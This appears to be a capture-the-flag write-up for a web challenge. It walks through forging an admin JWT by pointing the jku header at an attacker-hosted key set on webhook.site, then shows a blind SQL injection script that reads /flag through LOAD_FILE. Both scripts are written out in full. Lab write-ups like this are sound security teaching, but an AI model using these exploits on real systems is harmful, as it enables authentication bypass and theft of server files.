## MeMent0o

After registering a new user on the site, we get a jwt toke. Copying it onto jwt.io we can see this

![image](https://github.com/user-attachments/assets/76e5b34e-41b0-43ee-8436-f8a9b58d2e94)

The JWT verifiction code:

![image](https://github.com/user-attachments/assets/e779381e-b7bb-495f-9c92-596fe15a8445)

![image](https://github.com/user-attachments/assets/a1fd2f4d-12ad-4264-a1f6-af7cf0c0b11a)

So the app is sending request to what the jku header is set to andretrieving the public key from it.
Hence we can create a new keypair of private and public keys, craft a JWT token with username: admin , set the jku 
header to http://mywebsite/jku where im placing my public key over there and then sign the JWT using my private key. 

To bypass kid verifications: Use a copy of their function app.go/jwks() with my public key to create the jku url content. 

script to create;
```
import jwt
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization

# load private key from keypair.pem
with open("keypair.pem", "rb") as key_file:
    private_key = serialization.load_pem_private_key(key_file.read(),password=None,backend=default_backend())

payload = {
    "username": "admin"
}

headers = {
    "alg": "RS256",                        									# Algorithm for signing
    "typ": "JWT",                          									# Type of the token
    "jku": "https://webhook.site/4a0469d3-0f24-4ec4-a756-0d554f1064f7",  	# JSON Web Key Set URL
    "kid": "001122334455"                  									# Key ID
}

token = jwt.encode(payload, private_key, algorithm="RS256", headers=headers)
print("JWT Token:", token)
```

after sending this JWT to /get_creds we recieve the user credentials so we have the admin password

Now in /notes endpoint, we have a possible sql vuln
![image](https://github.com/user-attachments/assets/d97513a2-22eb-4e1c-ade9-271baa89d027)

SQL script used
```
import requests
import urllib.parse

confirmed_flag = "" # the flag found so far 
url = "http://web1.securinets.tn/notes?search="
alphas = "abcdefghijklmnopqrstuvwxyz1234567890{}" #possible_chars
cookies = {"session":"28d1de0946822fb5_670afeb6.d0K5YwPnOxymhhshUUDPn7Lfqr0"}

while True:
    for alpha in alphas:
        payload = f"%' AND 1=2 UNION SELECT 1,2,3 FROM(SELECT LOAD_FILE('/flag') AS content) AS subquery WHERE content LIKE '{confirmed_flag+alpha}%' ;#"
        full_url = url+urllib.parse.quote_plus(payload) # url encode payload since it will be in the params
		found = requests.get(full_url,cookies=cookies).text.count("<h3>") # each time we get a computer symbol it's inside an h3 tag
        if found: 
            confirmed_flag += alpha
            break
	print(confirmed_flag)
```
Why the script is needed:
- In a blind SQL injection scenario, you don't get direct feedback from the server about the results of the query (i.e., you don't immediately see the contents of the file or database). Instead, you only get some kind of yes/no response based on your query.
- The server may indicate whether your guess is correct by subtly altering its behavior. In this case, the server might return an HTML response containing an `<h3>` tag if your guess is correct.
